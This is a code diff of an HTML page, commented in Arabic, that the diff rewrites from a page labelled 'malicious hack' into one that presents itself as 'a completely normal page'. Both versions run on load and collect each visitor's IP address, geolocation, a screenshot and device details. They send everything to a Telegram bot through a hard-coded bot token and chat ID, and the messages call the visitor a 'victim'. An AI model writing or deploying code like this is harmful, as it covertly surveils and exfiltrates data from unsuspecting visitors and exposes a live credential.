@@ -1,57 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>هاك خبيث</title>
+    <title>صفحة مزيفة</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <script>
-        async function stealData() {
-            // جمع الـ IP والموقع
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            const ip = ipData.ip;
-
-            let location = "غير متاح";
-            try {
-                const locResponse = await fetch(`http://ip-api.com/json/${ip}`);
-                const locData = await locResponse.json();
-                location = `${locData.city}, ${locData.country}`;
-            } catch (e) {}
-
-            // لقطة الشاشة
-            const screenshot = await html2canvas(document.body).then(canvas => canvas.toDataURL());
-
-            // معلومات الجهاز
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-
-            // إرسال البيانات إلى بوت التلجرام
-            const botToken = "8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU"; // استبدل بتوكن البوت
+        async function sendToTelegram(data) {
+            const botToken = "8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU"; // استبدل ببوتك
             const chatId = "5446862709"; // استبدل بآيدي الدردشة
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            
-            const text = `
-                📌 **ضحيه جديده** 📌
-                → IP: ${ip}
-                → الموقع: ${location}
-                → النظام: ${platform}
-                → المتصفح: ${userAgent}
-                ${screenshot ? `→ لقطة الشاشة: ${screenshot}` : ''}
-            `;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(data)}`;
+            await fetch(url);
+        }
 
-            await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'Markdown' })
+        function captureScreen() {
+            html2canvas(document.body).then(canvas => {
+                const screenshot = canvas.toDataURL('image/png');
+                sendToTelegram(`لقطة شاشة: ${screenshot}`);
             });
         }
 
-        // تشغيل عند فتح الصفحة
-        window.onload = stealData;
+        function getDeviceInfo() {
+            const info = `
+                عنوان IP: ${window.ip || "غير معروف"}
+                الموقع: ${window.location.href}
+                User Agent: ${navigator.userAgent}
+                نظام التشغيل: ${navigator.platform}
+                الذاكرة: ${navigator.deviceMemory || "غير معروف"} GB
+                المعالج: ${navigator.hardwareConcurrency || "غير معروف"} نواة
+            `;
+            sendToTelegram(info);
+        }
+
+        // جلب الـ IP
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                window.ip = data.ip;
+                sendToTelegram(`عنوان IP الضحية: ${data.ip}`);
+            });
+
+        // جلب الموقع الجغرافي
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                const location = `خط الطول: ${position.coords.latitude}, خط العرض: ${position.coords.longitude}`;
+                sendToTelegram(`الموقع الجغرافي: ${location}`);
+            });
+        }
+
+        // جمع المعلومات وإرسالها
+        setTimeout(() => {
+            captureScreen();
+            getDeviceInfo();
+        }, 3000);
     </script>
 </head>
 <body>
-    <h1>مرحبًا! هذه صفحة مزيفة لجمع البيانات.</h1>
+    <h1>مرحبًا! هذه صفحة عادية تمامًا 😊</h1>
+    <p>جاري التحميل...</p>
 </body>
 </html>
-
-
